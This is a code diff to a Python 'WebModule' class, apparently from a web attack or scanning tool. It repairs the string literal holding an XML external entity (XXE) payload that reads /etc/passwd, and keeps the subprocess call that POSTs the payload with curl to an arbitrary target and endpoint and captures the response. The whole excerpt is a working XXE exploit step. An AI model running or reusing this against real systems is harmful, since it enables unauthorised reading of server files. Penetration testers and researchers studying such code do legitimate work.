@@ -81,11 +81,7 @@ class WebModule:
             'timestamp': datetime.now().isoformat()
         }
         try:
-            xxe_payload = '<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<foo>&xxe;</foo>'
+            xxe_payload = '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<foo>&xxe;</foo>'
             cmd = ['curl', '-X', 'POST', '-H', 'Content-Type: application/xml',
                    '--data-binary', xxe_payload, 'http://' + target + endpoint]
             output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=10)
